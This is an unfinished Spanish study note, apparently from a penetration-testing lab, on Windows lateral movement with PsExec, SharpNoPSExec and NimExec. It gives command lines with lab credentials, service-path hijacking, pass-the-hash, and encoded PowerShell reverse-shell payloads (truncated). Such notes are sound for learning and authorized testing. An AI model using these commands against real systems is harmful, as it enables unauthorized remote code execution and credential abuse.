# Necesidades

- Privilegios de administrador local


# Desde windows

### PsExec

Es una herramienta parte del Sysinternals suite. 

1. Establece un link en la carpeta ADMIN$ (c:\windows) mediante SMB
2. Usa el service control manager(SCM) para iniciar el servicio PsExecsvc y setea un pipe.
3. Redirige los ingresos en la consola mediante el pipe.

##### Uso

    .\PsExec.exe \\SRV02 -i -u INLANEFREIGHT\helen -p RedRiot88 cmd

Si queremos ejecutarlo como NT AUTHORITY\SYSTEM

    .\PsExec.exe \\SRV02 -i -s -u INLANEFREIGHT\helen -p RedRiot88 cmd

### SharpNoPSExec

**Mejora el anonimato** aprovechando servicios que ya están corriendo en el host. 

No genera una shell de por sí, con lo que tendremos que generarla nosotros agregando un payload de revshell.

1. Busca todos los servicios en el host.
2. Identifica todos los que tienen el start como "disable" o "manual", que su estado es stopped y sean corridos con privilegios de LocalSystem.
3. Selecciona uno, modifica el path al binario del mismo para apuntar a un payload dado por el atacante.
4. Luego de la ejecución, espera 5 segundos para volver el servicio a su path original.

Por defecto usa las creds del user que está corriéndolo. Si quisieramos hacerlo con otro user podemos agregar las flag "--username", --"password" y "--domain"

    .\SharpNoPSExec.exe --target=172.20.0.52 --payload="c:\windows\system32\cmd.exe /c powershell -exec bypass -nop -e ...SNIP...AbwBzAGUAKAApAA=="

### NimExec

Funciona igual que SharpNoPSExec pero permite hacer un **pass the hash**

    .\NimExec -u <user> -d <domain> -h <hash> -t <ip> -c "cmd.exe /c powershell -e JABjAGwAaQBlAG...SNIP...AbwBzAGUAKAApAA==" -v

### reg.exe
# Continuará despues de comer un alto asado
